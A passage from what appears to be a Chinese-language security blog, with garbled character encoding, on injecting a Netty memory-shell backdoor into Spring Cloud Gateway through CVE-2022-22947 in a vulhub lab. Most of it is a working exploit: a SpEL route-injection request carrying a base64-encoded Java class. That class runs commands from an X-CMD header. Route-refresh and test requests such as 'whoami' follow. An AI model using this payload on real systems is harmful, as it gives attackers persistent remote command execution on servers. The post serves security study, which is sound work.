L2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEADXNldEFjY2Vzc2libGUBAAQoWilWAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAXamF2YS9sYW5nL3JlZmxlY3QvQXJyYXkBAAlnZXRMZW5ndGgBABUoTGphdmEvbGFuZy9PYmplY3Q7KUkBAANnZXQBACcoTGphdmEvbGFuZy9PYmplY3Q7SSlMamF2YS9sYW5nL09iamVjdDsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAdnZXROYW1lAQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEADWdldFN1cGVyY2xhc3MBAANzZXQBACcoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KVYBABhpby9uZXR0eS9jaGFubmVsL0NoYW5uZWwBACQoKUxpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxQaXBlbGluZTsBACBpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxQaXBlbGluZQEACWFkZEJlZm9yZQEAaShMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsSGFuZGxlcjspTGlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbFBpcGVsaW5lOwEAB2hlYWRlcnMBACsoKUxpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvSHR0cEhlYWRlcnM7AQAnaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBIZWFkZXJzAQAVKExqYXZhL2xhbmcvU3RyaW5nOylaAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAEbmV4dAEALmlvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwUmVzcG9uc2VTdGF0dXMBAAJPSwEAD3ByaW50U3RhY2tUcmFjZQEAJmlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbEhhbmRsZXJDb250ZXh0AQAPZmlyZUNoYW5uZWxSZWFkAQA8KExqYXZhL2xhbmcvT2JqZWN0OylMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsSGFuZGxlckNvbnRleHQ7AQAnaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBWZXJzaW9uAQAISFRUUF8xXzEBAClMaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBWZXJzaW9uOwEAGWlvL25ldHR5L3V0aWwvQ2hhcnNldFV0aWwBAAVVVEZfOAEAGkxqYXZhL25pby9jaGFyc2V0L0NoYXJzZXQ7AQAYaW8vbmV0dHkvYnVmZmVyL1VucG9vbGVkAQAMY29waWVkQnVmZmVyAQBNKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlO0xqYXZhL25pby9jaGFyc2V0L0NoYXJzZXQ7KUxpby9uZXR0eS9idWZmZXIvQnl0ZUJ1ZjsBAHUoTGlvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwVmVyc2lvbjtMaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBSZXNwb25zZVN0YXR1cztMaW8vbmV0dHkvYnVmZmVyL0J5dGVCdWY7KVYBACxpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvRnVsbEh0dHBSZXNwb25zZQEAK2lvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwSGVhZGVyTmFtZXMBAAxDT05URU5UX1RZUEUBABtMaW8vbmV0dHkvdXRpbC9Bc2NpaVN0cmluZzsBAFUoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7TGphdmEvbGFuZy9PYmplY3Q7KUxpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvSHR0cEhlYWRlcnM7AQANd3JpdGVBbmRGbHVzaAEANChMamF2YS9sYW5nL09iamVjdDspTGlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbEZ1dHVyZTsBACZpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxGdXR1cmVMaXN0ZW5lcgEABUNMT1NFAQAoTGlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbEZ1dHVyZUxpc3RlbmVyOwEAHmlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbEZ1dHVyZQEAC2FkZExpc3RlbmVyAQBSKExpby9uZXR0eS91dGlsL2NvbmN1cnJlbnQvR2VuZXJpY0Z1dHVyZUxpc3RlbmVyOylMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsRnV0dXJlOwAhABcAPgABAD8AAAAFAAEAQABBAAEAQgAAAC8AAQABAAAABSq3AAGxAAAAAgBDAAAABgABAAAADgBEAAAADAABAAAABQBFAEYAAAAJAEcASAABAEIAAAHDAAQACgAAALUSAksSAxIEA70ABbYABkwrBLYABysBA70ACLYACU0DPh0suAAKogCHLB24AAs6BBkExgB1GQS2AAy2AA0SDrYAD5kAZRkEtgAMEhC2ABE6BRkFBLYAEhkFGQS2ABM6BhkGtgAMtgAUEhW2ABE6BxkHBLYAEhkHGQa2ABM6CBkItgAMtgAUtgAUEha2ABE6CRkJBLYAEhkJGQi7ABdZtwAYtgAZEhpLhAMBp/93pwAHTBIcSyqwAAEAAwCsAK8AGwADAEMAAABaABYAAAAQAAMAEgAPABMAFAAUAB4AFgAoABcALwAYAEQAGQBQABoAVgAbAF8AHABuAB0AdAAeAH0AHwCPACAAlQAhAKMAIgCmABYArAAnAK8AJQCwACYAswAoAEQAAABwAAsAUABWAEkASgAFAF8ARwBLAEwABgBuADgATQBKAAcAfQApAE4ATAAIAI8AFwBPAEoACQAvAHcAUABMAAQAIACMAFEAUgADAA8AnQBTAFQAAQAeAI4AVQBMAAIAsAADAFYAVwABAAMAsgBYAFkAAABaAAAAHgAF/wAgAAQHAFsHAFwHAAgBAAD7AIX4AAVCBwAbAwABAF0AXgACAEIAAAB2AAUABQAAABwsuQAdAQA6BBkEEh4SH7sAF1m3ABi5ACAEAFexAAAAAgBDAAAADgADAAAALgAIADAAGwAxAEQAAAA0AAUAAAAcAEUARgAAAAAAHABfAGAAAQAAABwAYQBiAAIAAAAcAGMAZAADAAgAFABlAGYABABnAAAADQMAXwAAAGEAAABjAAAAAQBoAGkAAwBCAAABEAAEAAYAAABhLMEAIZkAVCzAACFOLbkAIgEAEiO2ACSZADctuQAiAQASI7YAJToEuwAmWbgAJxkEtgAotgAptwAqEiu2ACy2AC06BSorGQWyAC63AC+xpwAKOgQZBLYAMCssuQAxAgBXsQABAAwATQBRABsAAwBDAAAAMgAMAAAANwAHADgADAA6ABoAOwAnADwAQwA+AE0APwBOAEMAUQBBAFMAQgBYAEUAYABGAEQAAABIAAcAJwAnAGoAWQAEAEMACwBrAFkABQBTAAUAVgBXAAQADABMAGwAbQADAAAAYQBFAEYAAAAAAGEAbgBvAAEAAABhAFgATAACAFoAAAAPAAP8AE4HACFCBwAb+gAGAHAAAAAEAAEAGwBnAAAACQIAbgAAAFgAAAACAHEAcgACAEIAAACUAAYABQAAADa7ADJZsgAzLSyyADS4ADW3ADY6BBkEuQA3AQCyADgSObYAOlcrGQS5ADsCALIAPLkAPQIAV7EAAAACAEMAAAASAAQAAABKABQASwAkAEwANQBNAEQAAAA0AAUAAAA2AEUARgAAAAAANgBuAG8AAQAAADYAcwBZAAIAAAA2AHQAdQADABQAIgB2AHcABABnAAAADQMAbgAAAHMAAAB0AAAAAQB4AAAAAgB5<br></code></pre></td></tr></table></figure>





<p>ä½¿ç”¨  vulhub&#x2F;spring&#x2F;CVE-2022-22947 ç¯å¢ƒ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">docker compose up -d<br></code></pre></td></tr></table></figure>



<p>ä¼ å…¥å†…å­˜é©¬ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs plain">POST /actuator/gateway/routes/memshell HTTP/1.1<br>Host: 192.168.31.16:8080<br>Content-Type: application/json<br><br>&#123;<br>  &quot;predicates&quot;: [<br>    &#123;<br>      &quot;name&quot;: &quot;Path&quot;,<br>      &quot;args&quot;: &#123;<br>        &quot;_genkey_0&quot;: &quot;/memshell/**&quot;<br>      &#125;<br>    &#125;<br>  ],<br>  &quot;filters&quot;: [<br>    &#123;<br>      &quot;name&quot;: &quot;RewritePath&quot;,<br>      &quot;args&quot;: &#123;<br>        &quot;_genkey_0&quot;: &quot;#&#123;T(org.springframework.cglib.core.ReflectUtils).defineClass(&#x27;NettyMemshell&#x27;,T(org.springframework.util.Base64Utils).decodeFromString(&#x27;yv66vgAAADQBDwoAPgB6CAB7BwB8CABTBwB9CgAFAH4KAFwAfwcAgAoAXACBCgCCAIMKAIIAhAoACACFCgAFAIYIAIcKAFsAiAgASwoABQCJCgCKAH8KAIoAiwoABQCMCABOCACNBwCOCgAXAHoKAIoAjwgAkAcAkQgAkgsAkwCUCACVCACWCwCXAJgHAJkLACEAmggAmwoAnACdCgCcAJ4HAJ8KAKAAoQoAoACiCgCjAKQKACYApQgApgoAJgCnCgAmAKgJAKkAqgoAFwCrCgAbAKwLAK0ArgcArwkAsACxCQCyALMKALQAtQoAMgC2CwC3AJoJALgAuQgAugoAnAC7CwCtALwJAL0AvgsAvwDABwDBBwDCAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAA9MTmV0dHlNZW1zaGVsbDsBAAhkb0luamVjdAEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAVX3ZhbCRkaXNwb3NhYmxlU2VydmVyAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAFHZhbCRkaXNwb3NhYmxlU2VydmVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQAHX2NvbmZpZwEABmNvbmZpZwEAEF9kb09uQ2hhbm5lbEluaXQBAAZ0aHJlYWQBAAFpAQABSQEACmdldFRocmVhZHMBABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAB3RocmVhZHMBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQADbXNnAQASTGphdmEvbGFuZy9TdHJpbmc7AQANU3RhY2tNYXBUYWJsZQcAwwcAxAEADW9uQ2hhbm5lbEluaXQBAFcoTHJlYWN0b3IvbmV0dHkvQ29ubmVjdGlvbk9ic2VydmVyO0xpby9uZXR0eS9jaGFubmVsL0NoYW5uZWw7TGphdmEvbmV0L1NvY2tldEFkZHJlc3M7KVYBABJjb25uZWN0aW9uT2JzZXJ2ZXIBACJMcmVhY3Rvci9uZXR0eS9Db25uZWN0aW9uT2JzZXJ2ZXI7AQAHY2hhbm5lbAEAGkxpby9uZXR0eS9jaGFubmVsL0NoYW5uZWw7AQANc29ja2V0QWRkcmVzcwEAGExqYXZhL25ldC9Tb2NrZXRBZGRyZXNzOwEACHBpcGVsaW5lAQAiTGlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbFBpcGVsaW5lOwEAEE1ldGhvZFBhcmFtZXRlcnMBAAtjaGFubmVsUmVhZAEAPShMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsSGFuZGxlckNvbnRleHQ7TGphdmEvbGFuZy9PYmplY3Q7KVYBAANjbWQBAApleGVjUmVzdWx0AQALaHR0cFJlcXVlc3QBAClMaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBSZXF1ZXN0OwEAA2N0eAEAKExpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxIYW5kbGVyQ29udGV4dDsBAApFeGNlcHRpb25zAQAEc2VuZAEAbShMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsSGFuZGxlckNvbnRleHQ7TGphdmEvbGFuZy9TdHJpbmc7TGlvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwUmVzcG9uc2VTdGF0dXM7KVYBAAdjb250ZXh0AQAGc3RhdHVzAQAwTGlvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwUmVzcG9uc2VTdGF0dXM7AQAIcmVzcG9uc2UBAC5MaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0Z1bGxIdHRwUmVzcG9uc2U7AQAKU291cmNlRmlsZQEAEk5ldHR5TWVtc2hlbGwuamF2YQwAQABBAQAMaW5qZWN0LXN0YXJ0AQAQamF2YS9sYW5nL1RocmVhZAEAD2phdmEvbGFuZy9DbGFzcwwAxQDGDADHAMgBABBqYXZhL2xhbmcvT2JqZWN0DADJAMoHAMsMAMwAzQwAzgDPDADQANEMANIASAEADk5ldHR5V2ViU2VydmVyDADTANQMANUA1gcA1wwAzgDYDADZANEBAA9kb09uQ2hhbm5lbEluaXQBAA1OZXR0eU1lbXNoZWxsDADaANsBAA5pbmplY3Qtc3VjY2VzcwEAE2phdmEvbGFuZy9FeGNlcHRpb24BAAxpbmplY3QtZXJyb3IHANwMAGUA3QEAH3JlYWN0b3IubGVmdC5odHRwVHJhZmZpY0hhbmRsZXIBABBtZW1zaGVsbF9oYW5kbGVyBwDeDADfAOABACdpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvSHR0cFJlcXVlc3QMAOEA4gEABVgtQ01EBwDjDADTAOQMAM4A5QEAEWphdmEvdXRpbC9TY2FubmVyBwDmDADnAOgMAOkA6gcA6wwA7ADtDABAAO4BAAJcQQwA7wDwDADxAEgHAPIMAPMAdQwAcQByDAD0AEEHAPUMAPYA9wEAM2lvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9EZWZhdWx0RnVsbEh0dHBSZXNwb25zZQcA+AwA+QD6BwD7DAD8AP0HAP4MAP8BAAwAQAEBBwECBwEDDAEEAQUBABl0ZXh0L3BsYWluOyBjaGFyc2V0PVVURi04DADaAQYMAQcBCAcBCQwBCgELBwEMDAENAQ4BACVpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxEdXBsZXhIYW5kbGVyAQAncmVhY3Rvci9uZXR0eS9DaGFubmVsUGlwZWxpbmVDb25maWd1cmVyAQAQamF2YS9sYW5nL1N0cmluZwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEADXNldEFjY2Vzc2libGUBAAQoWilWAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAXamF2YS9sYW5nL3JlZmxlY3QvQXJyYXkBAAlnZXRMZW5ndGgBABUoTGphdmEvbGFuZy9PYmplY3Q7KUkBAANnZXQBACcoTGphdmEvbGFuZy9PYmplY3Q7SSlMamF2YS9sYW5nL09iamVjdDsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAdnZXROYW1lAQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEADWdldFN1cGVyY2xhc3MBAANzZXQBACcoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KVYBABhpby9uZXR0eS9jaGFubmVsL0NoYW5uZWwBACQoKUxpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxQaXBlbGluZTsBACBpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxQaXBlbGluZQEACWFkZEJlZm9yZQEAaShMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsSGFuZGxlcjspTGlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbFBpcGVsaW5lOwEAB2hlYWRlcnMBACsoKUxpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvSHR0cEhlYWRlcnM7AQAnaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBIZWFkZXJzAQAVKExqYXZhL2xhbmcvU3RyaW5nOylaAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAEbmV4dAEALmlvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwUmVzcG9uc2VTdGF0dXMBAAJPSwEAD3ByaW50U3RhY2tUcmFjZQEAJmlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbEhhbmRsZXJDb250ZXh0AQAPZmlyZUNoYW5uZWxSZWFkAQA8KExqYXZhL2xhbmcvT2JqZWN0OylMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsSGFuZGxlckNvbnRleHQ7AQAnaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBWZXJzaW9uAQAISFRUUF8xXzEBAClMaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBWZXJzaW9uOwEAGWlvL25ldHR5L3V0aWwvQ2hhcnNldFV0aWwBAAVVVEZfOAEAGkxqYXZhL25pby9jaGFyc2V0L0NoYXJzZXQ7AQAYaW8vbmV0dHkvYnVmZmVyL1VucG9vbGVkAQAMY29waWVkQnVmZmVyAQBNKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlO0xqYXZhL25pby9jaGFyc2V0L0NoYXJzZXQ7KUxpby9uZXR0eS9idWZmZXIvQnl0ZUJ1ZjsBAHUoTGlvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwVmVyc2lvbjtMaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBSZXNwb25zZVN0YXR1cztMaW8vbmV0dHkvYnVmZmVyL0J5dGVCdWY7KVYBACxpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvRnVsbEh0dHBSZXNwb25zZQEAK2lvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwSGVhZGVyTmFtZXMBAAxDT05URU5UX1RZUEUBABtMaW8vbmV0dHkvdXRpbC9Bc2NpaVN0cmluZzsBAFUoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7TGphdmEvbGFuZy9PYmplY3Q7KUxpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvSHR0cEhlYWRlcnM7AQANd3JpdGVBbmRGbHVzaAEANChMamF2YS9sYW5nL09iamVjdDspTGlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbEZ1dHVyZTsBACZpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxGdXR1cmVMaXN0ZW5lcgEABUNMT1NFAQAoTGlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbEZ1dHVyZUxpc3RlbmVyOwEAHmlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbEZ1dHVyZQEAC2FkZExpc3RlbmVyAQBSKExpby9uZXR0eS91dGlsL2NvbmN1cnJlbnQvR2VuZXJpY0Z1dHVyZUxpc3RlbmVyOylMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsRnV0dXJlOwAhABcAPgABAD8AAAAFAAEAQABBAAEAQgAAAC8AAQABAAAABSq3AAGxAAAAAgBDAAAABgABAAAADgBEAAAADAABAAAABQBFAEYAAAAJAEcASAABAEIAAAHDAAQACgAAALUSAksSAxIEA70ABbYABkwrBLYABysBA70ACLYACU0DPh0suAAKogCHLB24AAs6BBkExgB1GQS2AAy2AA0SDrYAD5kAZRkEtgAMEhC2ABE6BRkFBLYAEhkFGQS2ABM6BhkGtgAMtgAUEhW2ABE6BxkHBLYAEhkHGQa2ABM6CBkItgAMtgAUtgAUEha2ABE6CRkJBLYAEhkJGQi7ABdZtwAYtgAZEhpLhAMBp/93pwAHTBIcSyqwAAEAAwCsAK8AGwADAEMAAABaABYAAAAQAAMAEgAPABMAFAAUAB4AFgAoABcALwAYAEQAGQBQABoAVgAbAF8AHABuAB0AdAAeAH0AHwCPACAAlQAhAKMAIgCmABYArAAnAK8AJQCwACYAswAoAEQAAABwAAsAUABWAEkASgAFAF8ARwBLAEwABgBuADgATQBKAAcAfQApAE4ATAAIAI8AFwBPAEoACQAvAHcAUABMAAQAIACMAFEAUgADAA8AnQBTAFQAAQAeAI4AVQBMAAIAsAADAFYAVwABAAMAsgBYAFkAAABaAAAAHgAF/wAgAAQHAFsHAFwHAAgBAAD7AIX4AAVCBwAbAwABAF0AXgACAEIAAAB2AAUABQAAABwsuQAdAQA6BBkEEh4SH7sAF1m3ABi5ACAEAFexAAAAAgBDAAAADgADAAAALgAIADAAGwAxAEQAAAA0AAUAAAAcAEUARgAAAAAAHABfAGAAAQAAABwAYQBiAAIAAAAcAGMAZAADAAgAFABlAGYABABnAAAADQMAXwAAAGEAAABjAAAAAQBoAGkAAwBCAAABEAAEAAYAAABhLMEAIZkAVCzAACFOLbkAIgEAEiO2ACSZADctuQAiAQASI7YAJToEuwAmWbgAJxkEtgAotgAptwAqEiu2ACy2AC06BSorGQWyAC63AC+xpwAKOgQZBLYAMCssuQAxAgBXsQABAAwATQBRABsAAwBDAAAAMgAMAAAANwAHADgADAA6ABoAOwAnADwAQwA+AE0APwBOAEMAUQBBAFMAQgBYAEUAYABGAEQAAABIAAcAJwAnAGoAWQAEAEMACwBrAFkABQBTAAUAVgBXAAQADABMAGwAbQADAAAAYQBFAEYAAAAAAGEAbgBvAAEAAABhAFgATAACAFoAAAAPAAP8AE4HACFCBwAb+gAGAHAAAAAEAAEAGwBnAAAACQIAbgAAAFgAAAACAHEAcgACAEIAAACUAAYABQAAADa7ADJZsgAzLSyyADS4ADW3ADY6BBkEuQA3AQCyADgSObYAOlcrGQS5ADsCALIAPLkAPQIAV7EAAAACAEMAAAASAAQAAABKABQASwAkAEwANQBNAEQAAAA0AAUAAAA2AEUARgAAAAAANgBuAG8AAQAAADYAcwBZAAIAAAA2AHQAdQADABQAIgB2AHcABABnAAAADQMAbgAAAHMAAAB0AAAAAQB4AAAAAgB5&#x27;),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject()&#125;&quot;,<br>        &quot;_genkey_1&quot;: &quot;/$&#123;path&#125;&quot;<br>      &#125;<br>    &#125;<br>  ],<br>  &quot;uri&quot;: &quot;https://xvshifu.github.io/&quot;,<br>  &quot;order&quot;: 0<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272054683.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>åˆ·æ–°è·¯ç”±ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">POST /actuator/gateway/refresh HTTP/1.1<br>Host: 192.168.31.16:8080<br>Content-Type: application/json<br>Connection: close<br>Content-Length: 258<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272101705.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>æŸ¥çœ‹æ·»åŠ çš„è·¯ç”±ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">GET /actuator/gateway/routes HTTP/1.1<br>Host: 192.168.31.16:8080<br>Connection: close<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272101150.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>æµ‹è¯•æ³¨å…¥æˆåŠŸï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">POST /actuator/gateway/memshell/test HTTP/1.1<br>Host: 192.168.31.16:8080<br>Content-Type: application/json<br>Connection: close <br>X-CMD: whoami <br>Content-Length: 0<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272101037.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272101993.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>è®°å¾—åˆ é™¤ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">DELETE /actuator/gateway/routes/memshell HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">192.168</span><span class="hljs-number">.31</span><span class="hljs-number">.16</span>:<span class="hljs-number">8080</span><br>Content-Type: application/json<br></code></pre></td></tr></table></figure>







<h2 id="3-3-Spring-å±‚å†…å­˜é©¬"><a href="#3-3-Spring-å±‚å†…å­˜é©¬" class="headerlink" title="3.3 Spring å±‚å†…å­˜é©¬"></a>3.3 Spring å±‚å†…å­˜é©¬</h2><h3 id="3-3-1-æ€è·¯"><a href="#3-3-1-æ€è·¯" class="headerlink" title="3.3.1 æ€è·¯"></a>3.3.1 æ€è·¯</h3><p>Spring å±‚ request è¯·æ±‚å¤„ç†ç»„ä»¶å¾ˆå¤šï¼Œæœ‰ handler&#x2F;Adapter&#x2F;Filter ç­‰ç­‰ï¼Œç†è®ºä¸Šéƒ½å¯ä»¥æ‹¿æ¥åšå†…å­˜é©¬ï¼Œè¿™é‡Œæˆ‘åˆ†äº«ä¸‹æœ€ç®€å•çš„ RequestMappingHandlerã€‚</p>
<p>Spring cloud gatewayä¸»è¦çš„è·¯ç”±åˆ†å‘ä¸»è¦ç”±<code>org.springframework.web.reactive.DispatcherHandler</code>ç±»å’Œå®ƒä¸‰ä¸ªç»„ä»¶æ¥å®Œæˆ</p>
<p>\1. org.springframework.web.reactive.HandlerMapping 	è·¯ç”±æ¯”é…å™¨</p>
<p>\2. org.springframework.web.reactive.HandlerAdapter 		handleré€‚é…å™¨</p>
<p>\3. org.springframework.web.reactive.HandlerResultHandler 	ç»“æœå¤„ç†å™¨</p>
<p><em>æºç è·¯å¾„ï¼š</em></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">org</span>\springframework\spring-webflux\<span class="hljs-number">5</span>.<span class="hljs-number">2</span>.<span class="hljs-number">15</span>.RELEASE\spring-webflux-<span class="hljs-number">5</span>.<span class="hljs-number">2</span>.<span class="hljs-number">15</span>.RELEASE-sources.jar!\org\springframework\web\reactive\DispatcherHandler.java<br></code></pre></td></tr></table></figure>

